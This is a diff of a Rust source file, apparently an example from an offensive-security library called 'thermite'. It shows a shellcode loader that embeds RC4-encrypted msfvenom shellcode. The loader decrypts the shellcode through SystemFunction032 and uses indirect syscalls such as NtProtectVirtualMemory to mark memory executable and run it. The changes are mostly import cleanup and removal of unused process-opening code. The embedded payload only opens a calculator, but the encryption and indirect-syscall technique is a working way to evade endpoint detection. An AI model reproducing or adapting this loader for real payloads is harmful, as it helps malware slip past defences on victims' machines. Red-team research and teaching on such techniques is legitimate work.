@@ -1,14 +1,16 @@
 use std::ffi::c_void;
 use std::ptr::null;
-use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, LPCSTR, HANDLE};
-use winapi::um::winnt::{
-	GENERIC_EXECUTE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS
-};
-use winapi::um::libloaderapi::LoadLibraryA;
 
-use thermite::{debug, error, info};
-use thermite::peb_walk::get_function_address;
+use winapi::shared::ntdef::{HANDLE, LPCSTR};
+use winapi::um::libloaderapi::LoadLibraryA;
+use winapi::um::winnt::{
+	GENERIC_EXECUTE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE
+};
+
+use thermite::{error, info};
 use thermite::indirect_syscall as syscall;
+use thermite::peb_walk::get_function_address;
+
 
 #[repr(C)]
 struct UString {
@@ -41,7 +43,7 @@ fn systemfunc032(data: &mut UString, key: &mut UString) -> Result<(), String> {
 fn main(){
 	// Simple pop calc shellcode from msfvenom, encrypted in RC4 using the following cyberchef recipe :
 	// https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')RC4(%7B'option':'Hex','string':'DEADBEEF'%7D,'Latin1','Latin1')To_Hex('0x%20with%20comma',16)
-	let mut encypted_shellcode: [u8; 276] = [
+	let encypted_shellcode: [u8; 276] = [
 		0x1f,0xdd,0x31,0xe1,0x7b,0xc0,0xb7,0x4c,0x9d,0xa1,0x45,0x21,0x7a,0x1a,0x4e,0x82,
 		0x7e,0x77,0x31,0x71,0xf7,0x3c,0xec,0x7e,0x12,0xde,0xc4,0x1b,0x03,0x2b,0x29,0xb8,
 		0x9a,0x33,0x4b,0xd9,0x91,0xa2,0x08,0xb8,0x71,0x44,0x79,0xc4,0x7e,0xa5,0xf8,0xfc,
@@ -63,24 +65,11 @@ fn main(){
 	];
 	let mut key: [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];
 
-	// Mostly the same code from the basic shellcode injector example
+	// I recycled the code from the shellcode injector example
+	// The only changes are lines 95-112
+	
 	let mut thread_handle: isize = 0;
-	let oa_process = OBJECT_ATTRIBUTES {
-		Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as _,
-		RootDirectory: 0u32 as _,
-		ObjectName: 0u32 as _,
-		Attributes: 0,
-		SecurityDescriptor: 0u32 as _,
-		SecurityQualityOfService: 0u32 as _,
-	};
-
-	let mut process_handle: isize = -1;
-
-	// let client_id = ClientId {
-	//  unique_process: pid as _,
-	//  unique_thread: 0 as _,
-	// };
-	// syscall!("NtOpenProcess", &mut process_handle, PROCESS_ALL_ACCESS, &oa_process, &client_id);
+	let process_handle: isize = -1;
 	let mut buf_size: usize = encypted_shellcode.len();
 	let mut base_addr: *mut u8 = 0u32 as _;
 
@@ -120,9 +109,8 @@ fn main(){
 			error!("Failed to decrypt shellcode: {}", e);
 		}
 	};
-
-
-	// Change protection status of allocated memory to READ+EXECUTE
+	
+	// Back to old code from the injector example
 	let mut bytes_written = encypted_shellcode.len();
 	let mut old_protec = PAGE_READWRITE;
 	syscall!("NtProtectVirtualMemory",
